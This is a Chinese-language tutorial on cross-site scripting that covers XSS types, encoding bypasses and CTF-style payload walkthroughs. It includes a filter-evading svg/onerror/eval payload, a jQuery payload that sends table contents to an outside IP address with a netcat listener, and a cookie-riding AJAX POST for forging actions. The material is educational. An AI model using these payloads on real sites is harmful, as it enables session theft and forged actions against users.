1.漏洞介绍

跨站脚本攻击（XSS）是Web安全中最常见的漏洞之一，攻击者通过注入恶意脚本在用户浏览器中执行，从而窃取数据、劫持会话或控制客户端操作。其核心原因是输入未过滤与输出未转义。

也就是攻击者向一些网页页面,插入一些恶意JS代码，等别人访问就会在其他人的浏览器上触发，这也是为什么叫跨站，它借用公共网站作为跳板

1.1触发条件

  • 用户可控制某个输入参数（如搜索框、URL参数）

  • 后端未对输入进行过滤或转义

  • 输入内容被页面输出展示

1.2几种XSS类型

反射型（非持久型）

脚本经过服务器反射后执行，不储存在服务器，仅单次请求有效。

脚本通过url传入，需要用户点击链接

DOM型

先介绍一下什么是DOM操作

DOM 全称 Document Object Model（文档对象模型），是浏览器定义的一套标准编程接口。 浏览器加载 HTML 页面时，会把整个 HTML 文档解析成一棵节点树：页面里的标签、文本、属性、注释，都会被转换成树上的一个个 “对象节点”。简单理解：DOM 就是浏览器把静态 HTML 页面，变成了 JavaScript 可以动态修改的 “可编程对象集合”。这个对象是document

这里提到了DOM就再说一下BOM

浏览器对象模型（BOM），控制的是浏览器窗口（地址栏，弹窗，跳转等）

核心对象

  • location控制浏览器地址栏
  • alert()/confirm()浏览器弹窗
  • history页面前进后退
  • setTimeout延时执行

那DOM 型 XSS，本质就是不安全的 DOM 操作直接导致的漏洞，它是完全是前端JS的问题，不经过服务器。

存储型

上传的恶意脚本，储存在服务器上，永久存在，只要用户访问就会触发脚本

编码绕过

浏览器对 XSS 代码的解析顺序为：HTML解码 —— URL解码 —— JS解码(只支持UNICODE)。

html实体编码

HTML编码是一种将字符串转换为HTML编码格式的过程。它通常用于在Web应用程序中处理用户输入或其他数据，以防止潜在的安全问题，如跨站脚本攻击（XSS）。HTML编码将HTML中不允许的字符转换为字符实体等效项，从而确保这些字符在浏览器中正确显示。以&开头;结尾，有时分号也可以省略

js编码

js 编码策略：

  1. "\" 加上三位八进制数字，如果个数不够，前面补0，例如 “<” 编码为 “\074”
  2. "\x" 加上两位十六进制数字，如果个数不够，前面补0，例如 “<” 编码为 “\x3c”
  3. "\u" 加上四位十六进制数字，如果个数不够，前面补0，例如 “<” 编码为 “\u003c”
  4. 对于一些控制字符，使用特殊的 C 类型的转义风格（例如 \n 和 \r）
base64编码

base64 编码通常需要使用到 data 伪协议。

通常与 base64 编码配合 data 协议的标签有 <object>,<a>,<iframe>,<embed>

atob 函数

atob() 方法用于解码使用 base-64 编码的字符串。

语法：window.atob(encodedStr)(encodedStr: 必需，是一个通过 btoa() 方法编码的字符串)

1.<svg/onload="...">

  • 是 HTML 原生矢量图形标签，这里用 `/` 写成自闭合形式，不需要额外写 闭合标签；
  • onload 是加载事件：SVG 元素被浏览器解析加载完成后，会自动执行属性内的 JS 代码，属于无交互自动触发，和 img onerror 效果一致，常用于绕过对 、 标签的过滤。
  1. window.onerror=eval;
  • 将浏览器的全局错误处理函数 window.onerror 直接赋值为 eval 函数；
  • 核心作用：页面后续发生任何未被捕获的 JS 错误时，浏览器都会自动把「错误信息字符串」作为第一个参数传给 eval，相当于执行 eval(错误信息内容)。
  • 绕过价值：没有直接写 eval(xxx) 的调用形式，可以绕过对 eval( 的正则关键字检测。
  1. throw'=alert\x281\x29';

  • throw：主动抛出一个自定义错误，用来触发上面设置好的 window.onerror 事件；

  • \x28、\x29：JavaScript 字符串的十六进制转义，分别对应左括号 ( 和右括号 )。JS 引擎解析代码时会自动把它们还原成真实括号，用来绕过后端 / WAF 对 ( ) 符号的过滤；

  • 开头的 =是整个 payload 的精髓：浏览器抛出未捕获错误时，会自动给错误信息加上

    Uncaught 前缀。我们抛出 =alert(1)最终完整的错误信息会变成 Uncaught =alert(1)

onload=：当 SVG 元素被浏览器加载完成时，自动执行后续 JS 代码。 和 onerror 一样，页面加载即自动触发，不需要用户点击、悬停等额外操作。

payload:利用类名查找，这里就是js代码，一点点看

document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')

  • 这是 DOM 原生方法，作用是获取页面中同时拥有 layui-table-cell 和 laytable-cell-1-0-1 两个 class 的所有元素。

  • 参数里用空格分隔多个类名，代表「且」的关系：元素必须同时包含这两个类名才会被匹配，和元素 class 属性里的类名顺序无关。

  • 这两个类名是

    layui 前端框架

    生成表格时自动给单元格加的类：

    • layui-table-cell：所有表格单元格的通用样式类；
    • laytable-cell-1-0-1：列标识类，用来精准定位表格中某一列的全部单元格。

  • 返回值是 HTMLCollection（类数组集合，不是真正的数组），且是实时动态的 —— 页面元素增删变化时，这个集合会自动同步更新。

[1]

  • 用索引从上面的类数组集合里取出单个元素，索引从 0 开始计数。
  • [1] 代表取第二个匹配到的元素（第一个匹配项是 [0]）。
  • 在表格场景里，通常 [0] 对应表头行的单元格，[1] 对应第一行数据的单元格，这也是题目里最常存 flag 的位置。

.innerHTML

  • 读取该元素内部的完整 HTML 内容，包括里面嵌套的标签、文本、元素属性等。
  • 如果只想要纯文本内容、不需要 HTML 标签，可以换成 .innerText 或 .textContent。

开监听然后注册

其他payload分析

1. 选择器：$('div.layui-table-cell.laytable-cell-1-0-1')

  • 这是 jQuery 元素选择器，依赖目标页面已加载 jQuery 库（$ 是 jQuery 的全局别名）。
  • 匹配规则：选中所有同时带有 layui-table-cell 和 laytable-cell-1-0-1 两个 class 的 div 元素。
  • 业务含义：laytable-cell-1-0-1 是 layui 框架给表格自动生成的列标识类名，同一列的所有单元格都会有相同的类名。这行代码的作用就是选中表格中某一列的全部单元格（包括表头、每一行数据）。

2. 遍历：.each(function (index, value) { ... })

  • jQuery 的遍历方法，会逐个循环处理上面匹配到的每一个单元格。
  • index：当前单元格的索引（第几个）；value：当前单元格的原生 DOM 对象。

3.条件判断：两层过滤

两个条件必须同时满足，才会执行外带逻辑：

  • 第一层：找 flag：

    检查单元格的 HTML 内容里是否包含

    字符串。

    返回 -1 代表不包含，大于 -1 就是包含，即命中了 flag 所在的单元格。

  • 第二层：防误判：

    要求单元格内容里

    不包含 script 字符串。作用是排除你自己注入的 payload 所在单元格，避免把脚本代码当成 flag 发出去，产生误报。

4. 外带逻辑：window.location.href = 'http://120.46.41.173:9023/' + value.innerHTML

  • 命中 flag 后，让当前页面直接跳转到你的服务器地址。
  • 特点：把 flag 直接拼在 URL 路径后面，而不是用 ?flag=xxx 参数。好处是用 nc -lvnp 9023 裸监听时，直接看 GET 请求的路径就能看到完整 flag，不用解析 URL 参数，查看更直观。

解释

$.ajax()

jQuery 库封装的异步请求方法，$ 是 jQuery 的全局别名。

  • 核心作用：在不刷新页面的情况下向后端接口发起 HTTP 请求，页面完全无变化，隐蔽性极强。
  • 必填前提：目标页面必须已经引入了 jQuery 库，否则 $ 会报「未定义」错误，整段代码直接不执行。

url:"api/change.php"

请求的目标接口地址，使用相对路径。

  • 因为是相对路径，浏览器会自动拼接当前页面的域名，请求会自动携带当前域名下的所有 Cookie（也就是受害者的登录凭证），天然带着登录态。

method:"POST"

指定请求方式为 POST。

  • 和 GET 请求不同，POST 的参数放在请求体中，不会出现在 URL 里，能适配绝大多数修改类后端接口（很多写操作接口只接受 POST 请求）。

data:{'p':'1717'}

POST 请求携带的参数，参数名为 p，参数值为 1717。

  • 具体含义由后端接口决定，CTF 题目里常见场景：p 是用户 ID、权限等级、内容 ID 等，比如调用这个接口可以把 ID 为 1717 的用户设为管理员，或者修改指定内容的可见状态。
